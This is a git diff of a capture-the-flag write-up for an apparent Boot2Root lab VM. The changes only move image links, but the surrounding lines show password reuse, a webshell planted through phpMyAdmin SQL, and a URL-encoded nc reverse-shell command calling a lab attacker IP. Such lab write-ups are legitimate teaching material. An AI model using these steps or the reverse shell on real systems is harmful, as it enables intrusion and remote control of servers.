@@ -104,7 +104,7 @@ Let's run `dirb` again on https:
 
 `dirb https://192.168.56.102 -o dirb-https.txt`
 
-> output is saved in `dirb-https.txt`
+> output is saved in `ressources/dirb-https.txt` 
 
 This time we find new folders:
  - `phpmyadmin/` : A Login page to phpmyadmin pannel, to manage MySQL databases
@@ -129,7 +129,7 @@ It works, we now have access to this forum account.
 
 On lmezard account, we can see her mail is `laurie@borntosec.net`
 
-![alt text](image.png)
+![alt text](../ressources/image.png)
 
 We noticed previously a webmail service on the serveur at `/webmail/`, let's try to use the same password.
 
@@ -137,7 +137,7 @@ It works, we can now access Laurie's mail.
 
 We can see she received a mail concerning a database access with the credentials: `root/Fg-'kKXBj87E:aJ$`
 
-![alt text](image-1.png)
+![alt text](../ressources/image-1.png)
 
 We know phpMyAdmin is running on the server at the address /phpmyadmin/, let's try to connect with these credentials.
 
@@ -149,7 +149,7 @@ First, we have to find a place where we can upload php files on the server.
 
 By scouting the pages found previously with `dirb`, we can see a `/forum/templates_c` page, which is a listable directory of php files, let's try to upload our webshell here.
 
-![alt text](image-2.png)
+![alt text](../ressources/image-2.png)
 
 We can upload a webshell on the server using a SQL request:
 ```sql
@@ -179,7 +179,7 @@ nc -lvnp 6942
 https://192.168.56.102/forum/templates_c/backdoor.php?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|bash%20-i%202%3E&1|nc%20192.168.56.101%206942%20%3E/tmp/f
 ```
 
-![alt text](image-3.png)
+![alt text](../ressources/image-3.png)
 
 __We now succesfully have a reverse shell on the server.__
 
@@ -196,7 +196,7 @@ Inside we find a password file with `lmezard:G!@M6f4Eatau{sF"`
 
 Let's try to switch user:
 
-![alt text](image-4.png)
+![alt text](../ressources/image-4.png)
 
 It works, we are now lmezard.
 
@@ -236,7 +236,7 @@ with open('output.c', 'a') as f :
         f.write(i)
 ```
 
-![alt text](image-5.png)
+![alt text](../ressources/image-5.png)
 
 We can now connect to laurie account by ssh after hashing `Iheartpwnage` with `echo -n "Iheartpwnage" | sha256sum`: 
 
@@ -244,7 +244,7 @@ We can now connect to laurie account by ssh after hashing `Iheartpwnage` with `e
 
 ## laurie
 
-![alt text](image-6.png)
+![alt text](../ressources/image-6.png)
 
 On her home we find a `bomb` binary file and a `README` telling us to defuse the bomb in order to connect to the user `thor`
 
